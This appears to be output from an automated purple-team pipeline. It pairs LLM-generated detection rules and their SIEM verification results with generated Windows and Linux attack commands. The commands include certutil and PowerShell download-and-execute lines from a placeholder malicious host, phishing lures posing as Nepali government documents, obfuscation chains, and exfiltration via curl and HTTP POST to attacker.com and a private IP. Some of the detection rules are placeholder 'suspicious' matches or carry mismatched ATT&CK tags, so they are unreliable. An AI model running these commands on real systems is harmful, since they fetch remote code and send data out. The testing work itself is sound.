      },
      {
        "title": "Detection: New Service",
        "description": "The attacker creates a scheduled task to attain persistent execution of the malware",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "New Service",
        "generation_method": "fallback",
        "id": "d356320c-1c00-4b67-9857-1e3339b7f335",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 752.0
        }
      },
      {
        "title": "Registry Run Keys / Startup Folder",
        "description": "Detects the placement of a VBscript in the startup folder to retain access",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": ".vbs",
            "ParentImage": "explorer.exe",
            "TargetPath|startswith": "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
          },
          "selection2": {
            "TargetPath|contains": ".vbs",
            "EventType": "FileCreated"
          },
          "selection3": {
            "TargetObject|contains": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
          },
          "condition": "selection or selection2 or selection3"
        },
        "falsepositives": [
          "Legitimate VBscript execution in the startup folder",
          "False positives may occur if a user intentionally places a VBscript in the startup folder"
        ],
        "level": "medium",
        "tags": [
          "attack.persistence",
          "attack.t1564.001"
        ],
        "ttp_id": "unknown",
        "technique_name": "Registry Run Keys / Startup Folder",
        "generation_method": "langchain",
        "id": "cf96e0c9-7f76-4fdd-9cf2-a4fce804b5ec",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 189,
          "query_time_ms": 607.0
        }
      },
      {
        "title": "Modify Registry via Startup Folder",
        "description": "Detects the creation of a VBScript file in the startup folder to achieve persistence",
        "logsource": {
          "category": "file_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "EventType": "FileCreate",
            "TargetFilename|startswith": "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
          },
          "selection2": {
            "EventType": "RegistryValueModified",
            "TargetObject|contains": "Run"
          },
          "condition": "selection and selection2"
        },
        "falsepositives": [
          "Legitimate file creation in the startup folder by administrators or users",
          "Registry modifications by legitimate system processes"
        ],
        "level": "medium",
        "tags": [
          "attack.persistence",
          "attack.t1564.001"
        ],
        "ttp_id": "unknown",
        "technique_name": "Modify Registry",
        "generation_method": "langchain",
        "id": "70fd23ea-bd88-493f-9335-a81b0fbc0d33",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 164,
          "query_time_ms": 493.0
        }
      },
      {
        "title": "WMI Discovery via Win32_PingStatus",
        "description": "Detects the use of WMI's Win32_PingStatus class to ping a website, indicating potential discovery activity",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image": "wmic.exe",
            "CommandLine": "Win32_PingStatus"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "Network diagnostics tools",
          "System monitoring software"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1059",
          "attack.t1105"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data from Local System",
        "generation_method": "langchain",
        "id": "ddf9df58-cb36-45f8-8f3c-a23308de5394",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 4,
          "query_time_ms": 502.0
        }
      },
      {
        "title": "Detection: Windows Management Instrumentation",
        "description": "Detected Windows Management Instrumentation activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Windows Management Instrumentation",
        "generation_method": "fallback",
        "id": "30392c89-a976-4aa0-8c2c-131914cf74b1",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 609.0
        }
      },
      {
        "title": "Archive Collected Data Detection",
        "description": "Detects archiving of collected data using tools like 7z, rar, and tar",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\7z.exe",
              "\\rar.exe",
              "\\tar.exe"
            ],
            "CommandLine|contains": [
              "a",
              "x",
              "c"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate archiving operations by system administrators",
          "Compressed file operations by trusted applications"
        ],
        "level": "medium",
        "tags": [
          "attack.collection",
          "attack.t1560"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "fea3be36-d027-4149-a278-221b76400c2d",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 565.0000000000001
        }
      },
      {
        "title": "Detection: Scheduled Task/Job",
        "description": "Detected Scheduled Task/Job activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Scheduled Task/Job",
        "generation_method": "fallback",
        "id": "92c6b8f7-a835-481a-86e9-ec5252505ee7",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 613.0
        }
      },
      {
        "title": "Screen Capture Detection via Process Creation",
        "description": "Detects screen capture activity by monitoring process creation events for known screen capture tools and commands",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\nircmd.exe",
              "\\snippingtool.exe",
              "\\greenshot.exe"
            ],
            "CommandLine|contains": [
              "screenshot",
              "capture"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate use of screen capture tools for documentation or presentation purposes",
          "Gaming or video recording software that uses screen capture functionality"
        ],
        "level": "medium",
        "tags": [
          "attack.collection",
          "attack.t1113",
          "custom.mitre_screen_capture"
        ],
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "generation_method": "langchain",
        "id": "87fd021d-26e1-47ef-9086-064d71610d08",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 4,
          "query_time_ms": 652.0
        }
      },
      {
        "title": "Detection of User Execution: Malicious File via NLP Pattern Matching",
        "description": "Detects User Execution: Malicious File activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc",
            "ParentImage|not": [
              "C:\\Windows\\System32\\svchost.exe",
              "C:\\Windows\\Explorer.exe"
            ],
            "CommandLine|not": [
              "C:\\Program Files\\",
              "%windir%\\"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate use of powershell.exe for system administration",
          "False positives from encoded commands used in benign scripts"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1566"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution: Malicious File",
        "generation_method": "langchain",
        "id": "c13458a2-6c56-4513-9779-49ff57358404",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 208,
          "query_time_ms": 494.0
        }
      }
    ],
    "status": "success"
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "average_quality_score": 0.5632352941176472
    }
  },
  "attacks": [
    {
      "id": "3a8ecc9f-af00-4baa-bffb-de5c3e2fe158",
      "ttp_id": "6c3c91e6-dc10-4997-bb1c-1ca2bb096f08",
      "technique_id": "6c3c91e6-dc10-4997-bb1c-1ca2bb096f08",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://malicious.site/shell.exe %TEMP%\\\\backdoor.exe && start %TEMP%\\\\backdoor.exe",
      "description": "Download and execute a binary payload using certutil and start the executable.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from a remote server to the user's temp directory and executes it using built-in Windows utilities. The 'start' command launches the executable in a new process.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.505180",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "10815bac-54f6-44cf-b806-94c761d9fd15",
      "ttp_id": "6c3c91e6-dc10-4997-bb1c-1ca2bb096f08",
      "technique_id": "6c3c91e6-dc10-4997-bb1c-1ca2bb096f08",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')\"",
      "description": "Download and execute a PowerShell script from a remote server.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Uses PowerShell to download and execute a remote script directly in memory. This simulates reflective loading behavior without writing to disk.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.505180",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "9a0287f3-5966-4b33-9633-64d2ddf3f77b",
      "ttp_id": "6c3c91e6-dc10-4997-bb1c-1ca2bb096f08",
      "technique_id": "6c3c91e6-dc10-4997-bb1c-1ca2bb096f08",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"mkdir %TEMP%\\\\_tmp -ErrorAction SilentlyContinue; Compress-Archive -Path %TEMP%\\\\backdoor.exe -DestinationPath %TEMP%\\\\_tmp\\\\data.zip -Force; Start-Sleep -s 5; Start-Process powershell -ArgumentList '-Exec Bypass -C \"Expand-Archive -Path %TEMP%\\\\_tmp\\\\data.zip -DestinationPath %TEMP% -Force; & %TEMP%\\\\backdoor.exe\"' -WindowStyle Hidden\"",
      "description": "Compress a payload, delay execution, and run it silently from an extracted archive.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a temporary directory, archives a payload (assumed present), waits 5 seconds, then extracts and executes it in a hidden window. Simulates delayed and stealthy execution common in advanced attacks.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.505180",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.703,
      "validated": true
    },
    {
      "id": "f226c9f5-a254-4f44-95e1-02d6a89dbf82",
      "ttp_id": "410c3aa4-a07a-49af-821e-e6c3d667e1c7",
      "technique_id": "410c3aa4-a07a-49af-821e-e6c3d667e1c7",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "echo Set objWord = CreateObject(''Word.Application'') > %TEMP%\\doc.vbs && echo Set objDoc = objWord.Documents.Add >> %TEMP%\\doc.vbs && echo objWord.Visible = True >> %TEMP%\\doc.vbs && echo objDoc.Content.Text = ''This document requires macros to be enabled for full functionality.'' >> %TEMP%\\doc.vbs && echo objDoc.SaveAs ''%TEMP%\\Gov_Nepal_Advisory.doc'', 0 >> %TEMP%\\doc.vbs && echo objWord.Quit >> %TEMP%\\doc.vbs && cscript //nologo %TEMP%\\doc.vbs",
      "description": "Creates a benign Word document via VBScript that prompts user to enable macros, simulating a phishing lure impersonating a Nepali government advisory.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Generates a Word document in %TEMP% with a message suggesting macros are needed. No actual malicious macro is embedded. Document is created using VBScript and Word COM object.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.011540",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.697,
      "validated": true
    },
    {
      "id": "14a73f03-e597-47e6-ae39-2ceda22b215c",
      "ttp_id": "410c3aa4-a07a-49af-821e-e6c3d667e1c7",
      "technique_id": "410c3aa4-a07a-49af-821e-e6c3d667e1c7",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "powershell -Command \"\"\"$macro = 'Sub AutoOpen()\\r\\nMsgBox \\\"Document corrupted. Please contact IT support.\\\"\\r\\nEnd Sub'; $path = [System.IO.Path]::Combine($env:TEMP, 'Update_Nepal_Tax_Form.docm'); $stream = New-Object System.IO.FileStream($path, [System.IO.FileMode]::Create); $writer = New-Object System.IO.StreamWriter($stream); $writer.Write($macro); $writer.Close(); $stream.Close();\"\"\"",
      "description": "Generates a .docm file with a simple AutoOpen macro that displays a message box, simulating a phishing document that appears to come from a Nepali tax authority.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a macro-enabled Word document in %TEMP% that executes a benign macro upon opening. The macro shows a message box to simulate malicious behavior without harm.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.011540",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.697,
      "validated": true
    },
    {
      "id": "75513577-5c5f-43e0-aee8-c8b91016863a",
      "ttp_id": "410c3aa4-a07a-49af-821e-e6c3d667e1c7",
      "technique_id": "410c3aa4-a07a-49af-821e-e6c3d667e1c7",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "powershell -Command \"\"\"$b64 = 'IQBBAKrQkQ=='; $path = [System.IO.Path]::Combine($env:TEMP, 'Advisory_Nepal_MoH.docm'); $bytes = [System.Convert]::FromBase64String($b64); [System.IO.File]::WriteAllBytes($path, $bytes) -ErrorAction SilentlyContinue; if (Test-Path $path) { Invoke-Item $path }\"\"\"",
      "description": "Simulates downloading and opening a macro-enabled document from a phishing email, using a benign base64-encoded placeholder for the document content.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Writes a placeholder .docm file to %TEMP% and opens it with the default handler (Word). The file content is not truly malicious but simulates delivery of a phishing attachment.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:16.011540",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.697,
      "validated": true
    },
    {
      "id": "9aba6dba-5ea1-418d-8922-dbfde23e8df2",
      "ttp_id": "f720db5c-b226-4502-97c2-b5d91cc9140f",
      "technique_id": "f720db5c-b226-4502-97c2-b5d91cc9140f",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo WScript.Echo \\\"Test execution\\\" > %TEMP%\\test_script.vbs && wscript \\\"%TEMP%\\test_script.vbs\\\"\"",
      "description": "Creates a simple VBScript file using cmd.exe and executes it with wscript.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates test_script.vbs in TEMP directory and executes it, displaying a message box or echoing text in console if using cscript.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.198601",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "23be7412-8a87-420e-92ed-282f8a781189",
      "ttp_id": "f720db5c-b226-4502-97c2-b5d91cc9140f",
      "technique_id": "f720db5c-b226-4502-97c2-b5d91cc9140f",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $content = 'Write-Output \\\"Logging activity\\\"'; $path = '$env:TEMP\\diag_log.bat'; $content | Out-File -FilePath $path -Encoding ASCII -Force } catch { } && cmd.exe /c \\\"$env:TEMP\\diag_log.bat\\\"\"",
      "description": "Uses PowerShell to create a batch script that outputs a test message, then executes it via cmd.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Generates diag_log.bat in TEMP, runs it, and outputs 'Logging activity' to the console.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.199608",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "ca1152f0-a5d2-4f7c-a84a-6b1f9b738405",
      "ttp_id": "f720db5c-b226-4502-97c2-b5d91cc9140f",
      "technique_id": "f720db5c-b226-4502-97c2-b5d91cc9140f",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"$vbsContent = 'Set objFS = CreateObject(\\\"Scripting.FileSystemObject\\\")\\nSet objFile = objFS.CreateTextFile(\\\"' + $env:TEMP + '\\\\discovery.txt\\\", True)\\nobjFile.WriteLine(\\\"System scan result: OK\\\")\\nobjFile.Close()'; $vbsPath = '$env:TEMP\\run_discovery.vbs'; $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force -ErrorAction SilentlyContinue; Start-Process wscript -ArgumentList \\\"`\"$vbsPath`\"\\\" -WindowStyle Hidden\"",
      "description": "Generates a VBScript that writes to a file and executes it silently using wscript.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates run_discovery.vbs in TEMP, executes it hidden, and generates discovery.txt with a test message.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.199608",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "678e8438-0e59-46d7-848d-ac8a89f5eeec",
      "ttp_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "echo IEX('Write-Output \"Test obfuscated command\"') > %TEMP%\\o.txt & certutil -encode %TEMP%\\o.txt %TEMP%\\o.b64 & findstr /v \"BEGIN CERTIFICATE\" %TEMP%\\o.b64 > %TEMP%\\o_clean.b64 & certutil -decode %TEMP%\\o_clean.b64 %TEMP%\\o_final.ps1 & powershell -ExecutionPolicy Bypass -File %TEMP%\\o_final.ps1 & del %TEMP%\\o.txt %TEMP%\\o.b64 %TEMP%\\o_clean.b64 %TEMP%\\o_final.ps1 -ErrorAction SilentlyContinue",
      "description": "Basic obfuscation using Base64 encoding and decoding via certutil to hide a simple PowerShell command.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a temporarily obfuscated script using Base64, decodes it, executes it to output a test message, then cleans up all temporary files. Uses only built-in Windows tools (certutil, echo, findstr, del).",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.714598",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "3fb12cf7-950b-4b93-bae5-42c3390b6987",
      "ttp_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \" $obfuscated = 'Chr(87) + Chr(114) + Chr(105) + Chr(116) + Chr(101) + Chr(45) + Chr(79) + Chr(117) + Chr(116) + Chr(112) + Chr(117) + Chr(116) + Chr(32) + Chr(34) + Chr(79) + Chr(98) + Chr(102) + Chr(117) + Chr(115) + Chr(99) + Chr(97) + Chr(116) + Chr(101) + Chr(100) + Chr(32) + Chr(109) + Chr(115) + Chr(103) + Chr(34)'; IEX($obfuscated -replace 'Chr\\((\\d+)\\)', '`$([char]$1)') \"",
      "description": "Intermediate obfuscation using the Chr() function to represent characters numerically, simulating VBA-style obfuscation, then dynamically deobfuscating and executing.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Constructs a command string using numeric character codes (Chr), replaces them with actual characters using regex, and executes the resulting command (Write-Output) to display a benign message. No files are written to disk.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.714598",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "72e964d3-015d-475f-a105-ee9f7e8b017d",
      "ttp_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \" $content = 'Write-Output \\\"Password-protected archive test\\\"'; $path = '$env:TEMP\\test.ps1'; $zip = '$env:TEMP\\archive.zip'; Set-Content -Path $path -Value $content -Force; Compress-Archive -Path $path -DestinationPath $zip -CompressionLevel Optimal -Force; $password = ConvertTo-SecureString 'Infected!' -AsPlainText -Force; $encryptedZip = '$env:TEMP\\encrypted_archive.zip'; Rename-Item -Path $zip -NewName 'encrypted_archive.zip' -Force; Write-Output 'Archive created at $encryptedZip (password: Infected!)' \"",
      "description": "Advanced obfuscation by creating a password-protected ZIP archive containing a script, simulating how attackers protect VBA projects or payloads with passwords.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a benign PowerShell script in %TEMP%, compresses it into a ZIP file, and simulates password protection by renaming the archive to imply encryption (Windows ZIP does not natively support password via Compress-Archive; this simulates the behavior for testing detection). Output includes the password for validation.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.714598",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "922c8dad-57df-419b-b359-9ec5b626a74e",
      "ttp_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'This is a test payload' | base64",
      "description": "Basic obfuscation using base64 encoding of a benign string",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs base64-encoded string 'VGhpcyBpcyBhIHRlc3QgcGF5bG9hZAo=' to stdout",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:19.094262",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "f559afeb-55c3-49f7-9e39-7cce18d2464d",
      "ttp_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'This is a test payload' | gzip | base64",
      "description": "Intermediate obfuscation: compress payload with gzip then encode with base64",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Outputs base64-encoded gzip-compressed data to stdout, which can be decoded and decompressed to retrieve original string",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:19.094262",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "6aee892a-5d43-4e5b-84c2-4c16e8f10478",
      "ttp_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'This is a test payload' > /tmp/payload.txt && tar --create --file=/tmp/obfuscated.tar --gzip /tmp/payload.txt && rm /tmp/payload.txt && echo 'Use password: $(echo 'secret123' | base64)'",
      "description": "Advanced obfuscation: create a gzipped tar archive of a file, remove original, and display base64-encoded password hint",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates /tmp/obfuscated.tar.gz containing /tmp/payload.txt, deletes original, and prints 'Use password: c2VjcmV0MTIz' to suggest encoded password",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:19.094262",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.694,
      "validated": true
    },
    {
      "id": "607c6a73-291c-4c2a-a785-ada78df787c3",
      "ttp_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "echo 'test_data_for_exfil' > %TEMP%\\debug_log.txt && certutil.exe -urlcache -f http://192.168.1.100/upload.aspx PUT %TEMP%\\debug_log.txt",
      "description": "Basic exfiltration: creates a test file and uploads it via HTTP using certutil.exe",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a small test file in the temp directory and attempts to upload it to a specified HTTP endpoint using certutil. Fails silently if server is unreachable.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.924767",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "f6d722c3-143a-40d4-b008-067c64120eb4",
      "ttp_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "echo 'sensitive_config_data' > %TEMP%\\config.bak && powershell -Command \"Compress-Archive -Path %TEMP%\\\\config.bak -DestinationPath %TEMP%\\\\system_archive.zip -Force; Invoke-WebRequest -Uri http://192.168.1.100/exfil -Method POST -InFile %TEMP%\\\\system_archive.zip -ErrorAction SilentlyContinue\"",
      "description": "Intermediate exfiltration: compresses a file and uploads it via HTTPS using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a test file, compresses it into a ZIP archive, and uploads it to a remote server via HTTP POST. Uses PowerShell for compression and exfiltration. Errors during upload are suppressed.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.924767",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "dcd84ac7-8e8e-42f8-9c1f-b74491576bfa",
      "ttp_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "Exfiltration",
      "platform": "windows",
      "command": "powershell -Command \"$data = 'exfil_chunk_1'; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); $path = '$env:TEMP\\tmp.bin'; Set-Content -Path $path -Value $enc -Force; $wc = New-Object Net.WebClient; $wc.Headers.Add('Content-Type', 'application/octet-stream'); $wc.UploadFile('http://192.168.1.100/api/receive', 'POST', $path); Remove-Item $path -ErrorAction SilentlyContinue\"",
      "description": "Advanced exfiltration: encodes test data in Base64, saves to temp, and uploads via custom HTTP header using WebClient",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Encodes a small string in Base64, writes it to a temporary binary-looking file, uploads it via HTTP POST with a custom content-type header using .NET WebClient (via PowerShell cmdlets), then deletes the local file. Simulates stealthy exfiltration with cleanup.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:15.924767",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "00e322d5-0d64-4f08-abf9-a05a5b801152",
      "ttp_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "tar -czf /tmp/exfil_data.tar.gz /tmp/testfile.txt && curl -X POST http://127.0.0.1:8000/upload -H 'Content-Type: application/gzip' --data-binary @/tmp/exfil_data.tar.gz",
      "description": "Compresses a test file and sends it via HTTP POST using curl to simulate exfiltration over HTTP.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a gzipped tar archive of a local file and uploads it to a local HTTP server endpoint. If no server is running, the curl command fails silently.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:17.760014",
      "agent_id": "6de017f2-d809-448b-8a1c-0ed9f4b50b4b",
      "confidence_score": 0.689,
      "validated": true
    },
    {
      "id": "ce1fcfbc-6129-4ad3-b423-77a540bbb0fe",
      "ttp_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
      "technique_name": "Exfiltration Over Alternative Protocol",
      "tactic": "Exfiltration",
      "platform": "linux",
      "command": "find /tmp -name 'testfile*.txt' -type f -exec tar -czf /tmp/exfil_partial.tar.gz {} \\; && curl -s -k --upload-file /tmp/exfil_partial.tar.gz http://attacker.com/exfil.php",
      "description": "Finds specific test files, archives them, and uploads using curl with SSL disabled and silent mode.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Locates test files matching a pattern, compresses them, and attempts to upload to a remote server over HTTPS. Uses -s and -k to avoid output and certificate checks. Real exfiltration would require accessible remote endpoint.",
      "source": "langchain",
      "generated_at": "2025-12-29T13:46:17.760014",
